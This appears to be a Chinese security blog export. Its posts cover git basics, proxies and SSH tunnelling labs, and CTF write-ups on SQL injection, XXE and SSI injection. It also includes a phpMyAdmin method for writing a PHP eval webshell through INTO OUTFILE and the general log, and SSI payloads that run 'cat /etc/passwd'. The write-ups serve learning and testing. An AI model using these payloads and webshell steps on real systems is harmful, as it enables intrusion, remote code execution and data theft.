//将1.txt添加到暂存区。如果想要将本文件夹全部添加到暂存区那么可以 git add . git commit告诉Git 添加到仓库git commit -m ‘pqtest’//把文件提交到仓库，pqtest为本次修改的备注，通常用来备注复了某某bug等 还有一步推送出去，下面文章的github会讲到。4.status查看当前状态git status //查看状态是否有文件未提交 git bash支持许多linux命令，自带vi我们vi 1.txt修改 增加几个1111git diff 1.txt即可看到增加删减的东西。或者 git diff即可看到所有有变动的更改。 5.查看更改日志 git log 查看更改日志。6.版本回退 git reset –hard HEAD^ //版本回退到上一个版本。回退之后 git log也相应地删除。 git reflog 来查看历史操作，我们可以看到回退的版本。可以再次回退到之前的版本。 git reset –hard 96ddb1f 7.撤销操作如果你不小心修改了文件，但是忘记修改了哪里很细小的细节。有两种方法。第一种可以版本回退到上一个版本 ：git reset –hard HEAD^第二种撤销文件操作，git checkout – 1.txt （比如我修改的是1.txt） github管理1.我们先从本地连接到github，首先创建一个项目/库 2.然后打开gitbash 输入命令：ssh-keygen -t rsa -C “xxx@qq.com“//填写自己注册的邮箱即可 一路回车 其中（/c/users/1/.ssh/id_rsa）目录存放密钥。//我自己默认的路径，上图中第四行 打开 https://github.com/settings/ssh/new title 写备注，Key填写刚刚连接的时候目录下的密钥，id_rsa.pub文件打开复制密钥，全部保存到Key然后添加密钥即可。 然后检验是否成功连接 输入命令 ssh -T git@github.com 如果你是第一次，输入yes就可以了，我这个是之前配置过所以直接显示successful,如果你的是出现不是这些内容，有可能是显示权限问题什么的，就应该是我上面提到的那种情况，你看一下你生成密钥时是否操作正确，目录下是否有那个known_hosts这个文件。 3.最后配置config git config –global user.name “用户名” git config –global user.email “邮箱” 配置完成输入命令 git config –global –list查看是否配置成功。Git和github配置完了，现在可以在github托管我们的项目了。 4.打开一个文件夹打开git bash，使用输入命令git init来使他成为一个仓库。 5.然后远程连接到仓库。 输入命令：git remote add origin git@github.com:shuaizhupeiqi/test shuaizhupeiqi，是我的用户名，test是仓库名字 6.由于创建仓库的时候，默认创建了readme.md,所以本地是与仓库不同步的。我们先同步一下。 git pull git@github.com:shuaizhupeiqi/test 7.上传更新 第一步：git add . //后面是一个英文的.第二步：git commit –m “1” (如果提交单个文件1，就这样写；如果提交所有文件，写成：git commit –m *)第三步：git push git@github.com:shuaizhupeiqi/test//这样就可以推送上去了。 这样就完成了。]]></content>
      <tags>
        <tag>杂</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sql注入]]></title>
    <url>%2F2018%2F12%2F03%2Fsql%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[前言注入千百样，本文仅记录一些姿势供个人查阅。轻喷。 HTTP分割注入题目地址实验吧：加了料的报错注入。地址：http://ctf5.shiyanbar.com/web/baocuo/index.php 查看页面源代码，给出了我们sql查询语句很常规 &lt;!-- $sql=&quot;select * from users where username=&apos;$username&apos; and password=&apos;$password&apos;&quot;; --&gt; 根据提示 post传一个username和password然后开始注入 语句： username=admin&apos; or &apos;&amp;password=admin 显示 You are our member, welcome to enter，可以说明单引号空格没有被过滤，不过既然是报错注入，那么加个单引号试试。 语句： username=admin&apos;&amp;password=admin You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘admin’’ at line 1 接下来写报错语句语句： username=admin&apos;and updatexml(1,concat(0x7e,(select database()),0x7e),1) or &apos;&amp;password=admin 一翻测试之后发现,有个神奇的过滤，username过滤了（），password过滤了一切报错函数。 可以组合一下。username写函数updatexml。password写（），但是怎么合并为一起呢，想到sql语句是 select * from users where username=&apos;$username&apos; and password=&apos;$password $username=updatexm/*,$password=*/...这样sql语句会变成 select * from users where username=&apos;updatexm/* and password=&apos;*/... 这样便可以注释掉中间的代码一种骚姿势，接下来继续正常注入。 username=&apos; and updatexml/*&amp;password=*/(1,concat(0x7e,(select database()),0x7e),1) or &apos; 成功爆出来数据库名称。 语句 username=&apos; and updatexml/*&amp;password=*/(1,concat(0x7e,(select table_name from information_schema.tables where table_schema =&apos;error_based_hpf&apos;),0x7e),1) or &apos; =号被过滤，可以使用正则注入，也就是=换成regexp username=&apos; and updatexml/*&amp;password=*/(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema regexp&apos;error_based_hpf&apos;),0x7e),1) or &apos; 这里使用group_concat来爆出所有的表名字 XPATH syntax error: &apos;~ffll44jj,users~&apos; 查列 username=&apos; and updatexml/*&amp;password=*/(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name regexp&apos;ffll44jj&apos;),0x7e),1) or &apos; XPATH syntax error: &apos;~value~&apos; 查数据 username=&apos; and updatexml/*&amp;password=*/(1,concat(0x7e,(select value from ffll44jj),0x7e),1) or &apos; XPATH syntax error: &apos;~flag{err0r_b4sed_sqli_+_hpf}~&apos; 如果flag超过32位，可以mid截断来查询。不过本题中是禁止了mid函数的不过也不超过32位可以直接获取flag。 堆叠预编译注入首先了解下预处理语句 预制语句的SQL语法基于三个SQL语句： PREPARE stmt_name FROM preparable_stmt; EXECUTE stmt_name [USING @var_name [, @var_name] ...]; {DEALLOCATE | DROP} PREPARE stmt_name; 对于不确定参数以问号代替，然后using加入参数即可。 预处理语句可以和正常查询一样，但是查询方式稍有变化，在一些绕过中可以利用这种机制来进行sql注入。 堆叠注入 在一条sql语句执行完毕后，使用分号结尾，然后利用多条语句执行特性，然后完整攻击。 简单的堆叠查询。 mysql&gt; set @a=&apos;select * from user where id =1&apos;;prepare stmt from @a;execute stmt; Query OK, 0 rows affected (0.00 sec) Query OK, 0 rows affected (0.00 sec) Statement prepared +----+------------------+------------------+----------------------------------+---------------------------------------------------------------------------------+ | ID | username | email | password | img | +----+------------------+------------------+----------------------------------+---------------------------------------------------------------------------------+ | 1 | 275640346@qq.com | 275640346@qq.com | 20905fe3160505df06abf12bfc8294fa | ../upload/54223df3e0247c41ce29176d227f95cf/ae566253288191ce5d879e51dae1d8c3.png | +----+------------------+------------------+----------------------------------+---------------------------------------------------------------------------------+ 1 row in set (0.00 sec) 利用mysql的特性对十六进制也可进行查询。 如果对prepare excute等关键词无过滤便可以用这个特性绕过很多关键词来达到sql注入效果。 或者ascii来解码进行注入 mysql&gt; set @s=concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(100),char(97),char(116),char(97),char(98),char(97),char(115),char(101),char(40),char(41)); prepare a from @s;execute a;Query OK, 0 rows affected (0.00 sec) Query OK, 0 rows affected (0.00 sec)Statement prepared +------------+ | database() | +------------+ | qwb | +------------+ 1 row in set (0.00 sec) mysql&gt; select concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(100),char(97),char(116),char(97),char(98),char(97),char(115),char(101),char(40),char(41)); +---------------------------------------------------------------------------------------------------------------------------------------------------------------------------+ | concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(100),char(97),char(116),char(97),char(98),char(97),char(115),char(101),char(40),char(41)) | +---------------------------------------------------------------------------------------------------------------------------------------------------------------------------+ | select database() | +---------------------------------------------------------------------------------------------------------------------------------------------------------------------------+ 1 row in set (0.00 sec) 参考强网杯web-随便注 https://k-ring.github.io/2019/05/28/%E7%AC%AC%E4%B8%89%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFwriteup/]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[web漏洞之越权]]></title>
    <url>%2F2018%2F12%2F02%2Fweb%E6%BC%8F%E6%B4%9E%E8%B6%8A%E6%9D%83%2F</url>
    <content type="text"><![CDATA[水平越权实战在一次渗透测试中遇到几个经典的水平越权漏洞，以及几个权限绕过。 增加任意用户的购物车 点击加入购物车然后抓包， 一般越权漏洞都会将信息放在cookie中，严密的都会加token，此次遇到的一个水平越权，验证的信息全部放在cookie里，并且以 userinfo参数验证，耐心测试，后台验证的为ID，也就是说只要你修改对应ID，那么就会加入到对应用户的购物车了，一般这种接口都是网站，所以网站也可能全部都是验证ID。同样存在清空购物车，删除地址漏洞，水平越权。 此次渗透测试总结一个小经验，在测试后台到底验证什么参数的时候可一个一个抓包，删除其他参数，剩下自己所要尝试的，如果失败更换参数继续测试，也有很多时候他是callback多层认证用户信息，所以可能在后面一个包里，总之耐心点测试，此次测试也发现一个callbackjsonp,为返回用户信息认证，存在用户敏感信息。情况允许的时候可以一套组合拳带走！]]></content>
      <tags>
        <tag>web漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[正反向代理]]></title>
    <url>%2F2018%2F11%2F25%2F%E6%AD%A3%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%2F</url>
    <content type="text"><![CDATA[代理服务器什么是代理服务器（Proxy Serve）？提供代理服务的电脑系统或其它类型的网络终端,代替网络用户去取得网络信息。 代理服务器（Proxy Server）是一种重要的服务器安全功能，它的工作主要在开放系统互联(OSI)模型的会话层，从而起到防火墙的作用。代理服务器大多被用来连接INTERNET（国际互联网）和Local Area Network（局域网）。 代理顾名思义，是代替你做一些事情，把事情交给代理，他去帮你做你想做的。举例：你想去女寝取东西，碍于男人身份，找个女同学帮你去取，这个女人同学就是代理。如果女同学想隐藏你的身份就不会告诉宿管阿姨，也可以达到隐匿身份的作用。 为啥使用代理服务器1.提高访问速度由于目标主机返回的数据会存放在代理服务器的硬盘中，因此下一次客户再访问相同的站点数据时，会直接从代理服务器的硬盘中读取，起到了缓存的作用，尤其对于热门网站能明显提高访问速度。 2.防火墙作用由于所有的客户机请求都必须通过代理服务器访问远程站点，因此可以在代理服务器上设限，过滤掉某些不安全信息。同时正向代理中上网者可以隐藏自己的IP,免受攻击。 3.突破访问限制互联网上有许多开发的代理服务器，客户机在访问受限时，可通过不受限的代理服务器访问目标站点，通俗说，我们使用的翻墙浏览器就是利用了代理服务器，可以直接访问外网。 正反向代理区别正向代理： A同学在大众创业、万众创新的大时代背景下开启他的创业之路，目前他遇到的最大的一个问题就是启动资金，于是他决定去找马云爸爸借钱，可想而知，最后碰一鼻子灰回来了，情急之下，他想到一个办法，找关系开后门，经过一番消息打探，原来A同学的大学老师王老师是马云的同学，于是A同学找到王老师，托王老师帮忙去马云那借500万过来，当然最后事成了。不过马云并不知道这钱是A同学借的，马云是借给王老师的，最后由王老师转交给A同学。这里的王老师在这个过程中扮演了一个非常关键的角色，就是代理，也可以说是正向代理，王老师代替A同学办这件事，这个过程中，真正借钱的人是谁，马云是不知道的，这点非常关键。 我们常说的代理也就是只正向代理，正向代理的过程，它隐藏了真实的请求客户端，服务端不知道真实的客户端是谁，客户端请求的服务都被代理服务器代替来请求，某些科学上网工具扮演的就是典型的正向代理角色。用浏览器访问 http://www.google.com 时，被残忍的block，于是你可以在国外搭建一台代理服务器，让代理帮我去请求google.com，代理把请求返回的相应结构再返回给我。 反向代理： 大家都有过这样的经历，拨打10086客服电话，可能一个地区的10086客服有几个或者几十个，你永远都不需要关心在电话那头的是哪一个，叫什么，男的，还是女的，漂亮的还是帅气的，你都不关心，你关心的是你的问题能不能得到专业的解答，你只需要拨通了10086的总机号码，电话那头总会有人会回答你，只是有时慢有时快而已。那么这里的10086总机号码就是我们说的反向代理。客户不知道真正提供服务人的是谁。 反向代理隐藏了真实的服务端，当我们请求 www.baidu.com 的时候，就像拨打10086一样，背后可能有成千上万台服务器为我们服务，但具体是哪一台，你不知道，也不需要知道，你只需要知道反向代理服务器是谁就好了，www.baidu.com 就是我们的反向代理服务器，反向代理服务器会帮我们把请求转发到真实的服务器那里去。Nginx就是性能非常好的反向代理服务器，用来做负载均衡。 两者的区别在于代理的对象不一样：正向代理代理的对象是客户端，反向代理代理的对象是服务端，正向代理隐藏真实客户端，反向代理隐藏真实服务端。 1.位置不同正向代理，架设在客户机和目标主机之间；反向代理，架设在服务器端；2.代理对象不同正向代理，代理客户端，服务端不知道实际发起请求的客户端； 反向代理，代理服务端，客户端不知道实际提供服务的服务端； 正向代理–HTTP代理为多个人提供翻墙服务；反向代理–百度外卖为多个商户提供平台给某个用户提供外卖服务。1.用途不同正向代理，为在防火墙内的局域网客户端提供访问Internet的途径；反向代理，将防火墙后面的服务器提供给Internet访问；2.安全性不同正向代理允许客户端通过它访问任意网站并且隐藏客户端自身，因此必须采取安全措施以确保仅为授权的客户端提供服务；反向代理都对外都是透明的，访问者并不知道自己访问的是哪一个代理。 正反向代理，模拟vpn链接:https://shuaizhupeiqi.github.io/2018/11/20/%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84/ 参考：https://blog.csdn.net/zt15732625878/article/details/78941268]]></content>
      <tags>
        <tag>杂</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[端口映射-模拟VPN制作]]></title>
    <url>%2F2018%2F11%2F20%2F%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84%2F</url>
    <content type="text"><![CDATA[端口映射简介百度百科：端口映射是NAT的一种，功能是把在公网的地址转翻译成私有地址， 采用路由方式的ADSL宽带路由器拥有一个动态或固定的公网IP，ADSL直接接在HUB或交换机上，所有的电脑共享上网。 端口映射转发区别转发与映射，按理解意思，是用不同的方法实现同样的目标。 端口转发：你给我了，我打开看看，发现这上面标志显示是要给张三，那么我就给张三去。如果标志是给李四，那我就再给李四去。 端口映射：你放到我左手，我就直接给张三；你放到我右手，我就直接给李四。这中间我不管你放我手上的是什么东西。 转发的重点在“转”上面。送快递的过来，把所有快递都交给门口保安，保安再根据每件快递上的收件人来分发。映射，就是在大门口给每个人装个柜子，送快递的直接按收件人名字，把快递放到对应的柜子里面。 区别不大，实例中在慢慢理解吧! 端口映射的形象理解端口映射就类似一个中转站，三个人，第一个人要找第三个人传递信息必须告诉第二个人，然后第二个人转告第三个人。就字面意思–端口转发。有些时候还有一些妙用，比如网站藏匿端口，访问公网ip:8888端口，映射为内网端口的8080。 想实现访问公司局域网服务器，IP地址是172.16.1.215，如果我们出差在外，使用的电脑IP地址是192.168.10.215，怎么样去访问局域网服务器的地址172.16.1.215呢; 此时，我们可以登录局域网服务器所在的路由器，可以通过ipconfig获取网关地址，知道网关后登录到路由器后台，设置端口映射，将内部端口、外部端口设置为3737，内部IP设置为172.16.1.215，个人使用的电脑运行mstsc命令，在窗口中输入公司申请的公网IP+3737，就可以直接访问局域网服务器； 端口映射与VPN端口映射与VPN 目标都是为了从外网访问局域网内网，端口映射和VPN都可以实现远程控制访问 相同点：端口映射和VPN都可以实现通过外网访问内网。不同点：端口映射将端口暴露在公网中，使用nmap等端口扫描器可扫描，且端口映射数据没有进行加密处理，容易被截取并分析，对系统服务器以及网络安全造成威胁。而VPN 只有通过VPN创建用户，服务器那边的授权，客户端才能进行正常访问，安全性相对较高。 端口映射相对简单，VPN安全性更高 VM端口映射实例走一下 ，内外网的互通吧。 前言，要保证VM是nat连接。 1.打开VM左上角编辑，打开虚拟网络设置。 2.NAT设置如图 3.windows设置出站入站规则 入站规则，是别人访问自己的端口规则，设置80端口开放，别人就可以访问自己的IP的80端口，而出站规则是自己访问其他网站的端口，测试发现出站规则没看到80端口却可以访问80端口，dl说访问别人端口可能是用类似50000端口去访问别人的80端口，所以我们要访问别人10000端口的时候未必要设置出战规则端口10000。dl说看下tcp三次握手了解下。 4.测试结果 使用虚拟机 nc -lvvp 8888 访问物理机的6666端口即可转发到虚拟机的8888端口，记得设置入站规则6666端口，保证端口开放！先扫描下物理机6666端口。 可以看到 监听的6666端口在访问物理机的8888端口的时候成功捕捉到。由物理机6666端口映射到虚拟机的8888端口！ 一篇VM 很详细的参考文章：https://blog.csdn.net/BokeyGeGe/article/details/78631328 ssh隧道(重点)SSH会自动加密和解密所有SSH客户端与服务端之间的网络数据。但是，SSH还能够将其他TCP端口的网络数据通SSH链接来转发，并且自动提供了相应的加密及解密服务。这一过程也被叫做”隧道”（tunneling）。 这是因为SSH为其他TCP链接提供了一个安全的通道来进行传输而得名。例如，Telnet ，SMTP ，LDAP这些TCP应用均能够从中得益，避免了用户名，密码以及隐私信息的明文传输。而与此同时，如果工作环境许中的防火墙限制了一些网络端口的使用，但是允许SSH的连接，也能够将通过将TCP用端口转发来使用SSH进行通讯。 下面的VPN制作就用到了ssh隧道技术。 VM虚拟机模拟VPN翻墙—正向代理原理有三个机器，我们在第一台机器连接第二台机器ssh从而转发端口访问第三台机器。在第一台连接第二台的ssh 第一次失败实验前言：想测试下 三个内网IP 模拟谷歌翻墙，结果发现了点问题记录下! win10 target 1 192.168.100.219 linux target 2 192.168.189.129 linux target 3 192.168.189.131 打算模拟谷歌翻墙，首先打开两台linux 80 服务， 谷歌翻墙模拟，win10是一台国内被墙拦截的主机， linux 2 是一台墙外的一台服务器，可以访问谷歌。 linux 3 是要访问的服务器。在此代表谷歌。 第一步：先将win10 IP封禁。 这里遇到第一个问题，可以看到三个IP 不是全部在同一个IP段，如果 2号 和 3 号互相访问，他们在同一个IP段会直接访问，这里，3号禁止2号IP，可以禁止2号访问，但是3号和1号不在同一个IP段，且物理机与虚拟机之间网路通信貌似还要端口转发之类的或者是直接走物理网卡，反正就是禁了也会被绕过，保证三台服务器在同一个IP段下。全部换成桥接模式，接下来从新测试。 第二次模拟VPN制作从新开始！ 这里虚拟机换成桥接模式。 重启网络服务 service network restart //更换网络模式要重启网络！ linux target 1 192.168.100.194 linux target 2 192.168.100.110 linux target 3 192.168.100.176 #第一步 服务器3号封禁 linux 1 IP iptables -I INPUT -s 192.168.100.160 -j DROP //将linux1的包请求全部丢弃，访问停留几十秒最后无法访问。 iptables -A INPUT -s 192.168.100.194 -j REJECT //封禁IP iptables -I INPUT -s 192.168.100.219 -p tcp –dport 80 -j ACCEPT 解除限制 清空封掉的IP地址，可以输入：iptables –flush 而 2号服务器是可以正常访问 3号模拟谷歌服务器 这里我们已经禁了一号服务器，一号服务器来访问下三号服务器。 可以看到一号服务器已无法访问 三号谷歌服务器。 #第二步端口转发 首先查看自己开启的端口 我们选择一个端口1080端口建立动态转发的隧道， 第一台服务器下的命令：ssh -D 1080 -fN 192.168.100.110//这里我们ssh连接第二台服务器，本地1080端口转发。相当于第二台服务器是一个跳板。 命令注释： 选项：-f 后台启用 -N 不打开远程shell，处于等待状态（不加-N则直接登录进去） -g 启用网关功能 输入密码后登陆成功，在后台运行只是加入了一个进程。 此时访问 服务器3依然是不成功的。 设置代理服务器1访问服务器3，命令如下（在服务器1上输入）： curl --socks5 127.0.0.1:1080 http://192.168.100.176 可以看到已经访问到第三台模拟谷歌浏览器 #第三步 浏览器设置代理1080端口就可以浏览器便捷的进行访问 代理前 代理后，成功访问 如果有大陆以外的服务器，那么便可以自己制作VPN翻墙。简单使用！ 利用跳板转发端口原理有三个机器，我们在第二台跳板机器执行命令，从而使得一号和三号机器可以互相访问。 连接模式：桥接 linux target 1 192.168.100.110 linux target 2 192.168.100.194 linux target 3 192.168.100.176 首先，我们先模拟环境，用三号服务器封禁一号服务器的IP， root@kali:~# iptables -A INPUT -s 192.168.100.110 -j REJECT//禁止IP访问任意端口 可以看到禁止192.168.100.110IP访问本机的任意端口 我们使用三号服务器nc监听23端口。一号已经连接不到三号的23端口。二号服务器可以连接三号服务器23端口。环境搭建完毕。 root@kali:~# nc -lvvp 23 未完待续！ 然后在第二台主机输入命令 ssh -R 9527:192.168.100.176:23 -fN 192.168.100.110 然后我们在 第一台服务器上执行 telnet 127.0.0.1 9527即可访问。 可以看到nc监听的第三台机器 可以看到数据是从192.168.100.194（第三台主机）转发过来的 设置VPN 在第二台主机输入命令 ssh -R 1080:192.168.100.176:80 -fN 192.168.100.110 然后我们在 第一台服务器上执行 telnet 127.0.0.1 1080即可访问。 可以正常访问网页了。浏览器设置代理。 参考：https://www.cnblogs.com/phpdragon/p/5314650.html参考：https://www.cnblogs.com/keerya/p/7612715.html]]></content>
      <tags>
        <tag>杂</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[phpmyadmin两种拿shell]]></title>
    <url>%2F2018%2F11%2F18%2Fphpmyadmin%E6%8B%BFshell%2F</url>
    <content type="text"><![CDATA[简介phpMyAdmin 是一个以PHP为基础，以Web-Base方式架构在网站主机上的MySQL的数据库管理工具，让管理者可用Web接口管理MySQL数据库。借由此Web接口可以成为一个简易方式输入繁杂SQL语法的较佳途径，尤其要处理大量资料的汇入及汇出更为方便。其中一个更大的优势在于由于phpMyAdmin跟其他PHP程式一样在网页服务器上执行，但是您可以在任何地方使用这些程式产生的HTML页面，也就是于远端管理MySQL数据库，方便的建立、修改、删除数据库及资料表。也可借由phpMyAdmin建立常用的php语法，方便编写网页时所需要的sql语法正确性。 暴绝对路径要写文件必须要知道根路径，否则即使写入了也无法访问，也就自然无法getshell， phpmyadmin直接写入文件先要知道根路径利用错误爆路径等，这里用phpinfo查看根路径 写入 一句phpinfo文件， SELECT &quot;&lt;?php phpinfo();?&gt;&quot; INTO OUTFILE &quot;E:\\wamp\\wamp\\www\\2.php&quot; 这里必须注意要双反斜线，否则会转义， 可以看到已经上传并且解析 利用日志getshell原理，phpmyadmin有一个记录日志的文件，但是一般情况下会关闭，开启日志记录，然后设置日志记录名称为.php，随便执行sql语句，只要包括一句话木马就会被写入到日志中去，然后就可以连接getshell 第一步手动开启日志。 set global general_log=’on’ //首先设置为on 然后 查看是否开启成功 show variables like “general_log%” ON为开启，此时我们设置 日志路径 set global general_log_file =&quot;E:\\wamp\\wamp\\www\\3.php&quot; 然后只要执行的语句都会写入到日志文件中，所以我们查询语句select ‘&lt;?php eval($_POST[‘a’]);?&gt;’ 会报错但是已经写入到日志中去了 此时连接网站/3.php即可getshell。]]></content>
      <tags>
        <tag>web漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[个人网址收藏]]></title>
    <url>%2F2018%2F11%2F18%2F%E7%BD%91%E5%9D%80%E6%94%B6%E8%97%8F%2F</url>
    <content type="text"><![CDATA[web渗透博客https://chybeta.github.io/2017/08/19/Web-Security-Learning/ php代码审计入门总结http://www.360doc.com/content/16/0215/14/26186435_534767147.shtml http://www.am0s.com/ CTF工具库https://www.ctftools.com/down/ 子域名在线接口http://ce.baidu.com http://look.mimaz.org 解密cms识别等综合工具http://tools.bugscaner.com/（实用） 指纹识别http://www.yunsee.cn/ http://finger.tidesec.net/ 开源：https://github.com/TideSec/TideFinger?tdsourcetag=s_pcqq_aiomsg wtf_scan 开源：https://github.com/dyboy2017/WTF_Scan 社工注册过网站的手机号邮箱https://www.reg007.com/s/798648772-at-qq.com// 网盘爬虫http://tansuo233.com 威胁情报分析https://x.threatbook.cn/ https://poma.nsfocus.com https://ti.360.net https://www.virustotal.com http://www.threatcrowd.org https://community.riskiq.com https://www.venuseye.com.cn https://exchange.xforce.ibmcloud.com/ https://alice.tj-un.com/# 渗透工具集合https://www.jianshu.com/p/fc4ed837acac https://blog.csdn.net/Bul1et/article/details/85157176]]></content>
      <tags>
        <tag>杂</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SSI服务器注入]]></title>
    <url>%2F2018%2F11%2F17%2FSSI%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[什么是SSI全程：server side includes injection 服务器端包含注入 SSI是英文Server Side Includes的缩写，翻译成中文就是服务器端包含的意思。从技术角度上说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针。SSI具有强大的功能，只要使用一条简单的SSI 命令就可以实现整个网站的内容更新，时间和日期的动态显示，以及执行shell和CGI脚本程序等复杂的功能。它与CGI类似，不同之处在于SSI用于在加载当前页面之前或在页面可视化时执行某些操作。 为此，Web服务器在将页面提供给用户之前分析SSI 从技术角度上来说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针，即允许通过在HTML页面注入脚本或远程执行任意代码。 在很多场景中，用户输入的内容可以显示在页面中，比如一个存在反射XSS漏洞的页面，如果输入的payload不是xss代码而是ssi的标签，服务器又开启了ssi支持的话就会存在SSI漏洞 一种对于这类漏洞的挖掘方式即是查看.stm，.shtm和.shtml的页面是否存在，但是缺少这些类型的页面并不意味着不存在SSI攻击。 SSI漏洞产生的条件用户存在可控输入，并且未过滤，并且还能回显嵌入到html中，如其中一条 &lt;!--#exec cmd=&quot;&quot;...&quot;&quot;--&gt;（会执行给定的 shell 命令） 如果没有过滤吧&lt;!#–等敏感字符，就会造成系统命令执行，通常存在XSS的地方如果开启了SSI服务，那么就会造成服务器注入 &lt;!--#include file=&quot;&quot;...&quot;&quot;--&gt;（会显示给定的文件） SSI命令语法解析 ①显示服务器端环境变量&lt;#echo&gt; 本文档名称： &lt;!--#echo var=&quot;DOCUMENT_NAME&quot;--&gt; 现在时间： &lt;!--#echo var=&quot;DATE_LOCAL&quot;--&gt; 显示IP地址： &lt;!--#echo var=&quot;REMOTE_ADDR&quot;--&gt; ②将文本内容直接插入到文档中&lt;#include&gt; &lt;!--#include file=&quot;文件名称&quot;--&gt; &lt;!--#include virtual=&quot;index.html&quot; --&gt; &lt;!--#include virtual=&quot;文件名称&quot;--&gt; &lt;!--#include virtual=&quot;/www/footer.html&quot; --&gt; 注：file包含文件可以在同一级目录或其子目录中，但不能在上一级目录中，virtual包含文件可以是Web站点上的虚拟目录的完整路径 ③显示WEB文档相关信息&lt;#flastmod&gt;&lt;#fsize&gt;(如文件制作日期/大小等) 文件最近更新日期： &lt;!--#flastmod file=&quot;文件名称&quot;--&gt; 文件的长度： &lt;!--#fsize file=&quot;文件名称&quot;--&gt; ④直接执行服务器上的各种程序&lt;#exec&gt;(如CGI或其他可执行程序) &lt;!--#exec cmd=&quot;文件名称&quot;--&gt; &lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt; &lt;!--#exec cgi=&quot;文件名称&quot;--&gt; &lt;!--#exec cgi=&quot;/cgi-bin/access_log.cgi&quot;--&gt; ⑤一次CTF中用到的指令 &lt;!--%23include virtual=&quot;flag&quot; --&gt; 1、显示服务器端环境变量&lt;#echo&gt;2、将文本内容直接插入到文档中&lt;#include&gt;3、显示WEB文档相关信息&lt;#flastmod #fsize&gt; (如文件制作日期/大小等)4、直接执行服务器上的各种程序&lt;#exec&gt;(如CGI或其他可执行程序)5、设置SSI信息显示格式&lt;#config&gt;(如文件制作日期/大小显示方式) 高级SSI可设置变量使用if条件语句。 SSI指令基本格式：&lt;!-– 指令名称=”指令参数”&gt; 注意：1．&lt;!–与#号间无空格，只有SSI指令与参数间存在空格。2．上面的标点=””，一个也不能少。3．SSI指令是大小写敏感的，因此参数必须是小写才会起作用。有的时候可使用`来绕过对”的过滤//有时候 有时候， SSI命令：https://www.owasp.org/index.php/Server-Side_Includes_%28SSI%29_Injectionhttps://www.cnblogs.com/wqhwe/p/5442612.html CTF实战SSIEIS-2018ctf挑战赛 SSI漏洞挖掘SSI漏洞，一般存在xss的地方都值得一试。 并非所有文件中的SSI指令都会被解析，必须告诉Apache应该解析哪些文件。有两种方法使Apache解析带有特定后缀名的文件，比如：.shtml ，配置如下： AddType text/html .shtml AddOutputFilter INCLUDES .shtml .stm，.shtm和.shtml的页面是否存在文件后缀名是用来表明网页文件是否包含SSI指令的，因此如果该网站使用了.shtml文件，那说明该网站支持SSI指令。然而.shtml后缀名并非是强制规定的，因此如果没有发现任何.shtml文件，并不意味着目标网站没有受到SSI注入攻击的可能。 SSI防护默认apache不开启ssi，ssi这种技术已经比较少用了。如果应用没有使用到ssi，关闭服务器对ssi的支持即可。 参考：https://www.cnblogs.com/jokermoon/p/6708691.html]]></content>
      <tags>
        <tag>渗透攻防</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[EIS-CTF2018]]></title>
    <url>%2F2018%2F11%2F16%2F2018%20%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9B%2F</url>
    <content type="text"><![CDATA[simpleBBS题目：http://bbs.sec.zju.edu.cn/ 进入网站 注册 登录 题目中没有任何提示，只说是简单的bbs（论坛）各种操作轮番上阵xss各种弹，没卵用，甚至右边有个文件上传测试，以为是文件上传，结果也没找到上传点，好吧放弃了， 那是不可能的，一翻py，fuzz，注册的时候会报错，说明注册的时候需要加一个参数sn，抓包添加sn参数，注册成功。不过给我最大的启发是这个页面报错，数据库，难道暗示着 数据库报错，注入？试试 注册页面翻云覆雨的fuzz，好吧单引号过滤了，我注入你个螺旋大锤子。？？不对，我登录页面给个单引号呢，经过一翻测试，必须要已经注册的账号加单引号才有效。好的 测试开始，账号 username=xiaozhupeiqi1’&amp;password123456这是啥？？数据库报错？好了，二话不说就是报错注入，flag出来了，hiahiahia，提交，乔德麻袋？？flag咋不全，别担心换个函数username=aaa’ and 1=updatexml(1,concat(0x3a,(select mid(flag,32,32) from flag) ,0x3a),1)–OK了剩下的几位也出来了。此题 完！ SimpleExtensionExplorerInjection请看题目，重点 xxe，后面是/flag，就是flag路径， 开局两个框，抓包! 我*？不是xml吗，你给我发个json格式包，你想做爪子？不对，这是ctf，这很正常，佩奇老哥给你传个xml格式试试水， 牛皮，xml 数据可以传输，那么比较容易忽视的点来了，三个箭头的地方原本是json,既然要传输xml，一定要修改成xml，否则你做出来我吃*，然后xxe,不会的请自行参考我的博客xxe，来个payload 包，完结！ SimpleServerInjection 重点，SSI 是服务器注入，拓展下，ssti是服务器模版注入，名字很像，利用方式有区别，然后flag在当前目录下， 这道CTF题还是比较简单，但是需要点，点不对打死也做不出来，想复杂的话 更做不出来。 payload name=&lt;!--%23exec cmd=&quot;cat /etc/passwd&quot;--&gt; 这里有个小点，如果是#浏览器会自动当成注释，不会解析发包，所以这里给编码%23但是并没卵用，一开始以为会过滤了东西，但是看不出来哪过滤了，这个时候就要多尝试命令，毕竟ssi有那么多命令尝试过后使用 name=&lt;!--%23include virtual=&quot;flag&quot;--&gt; 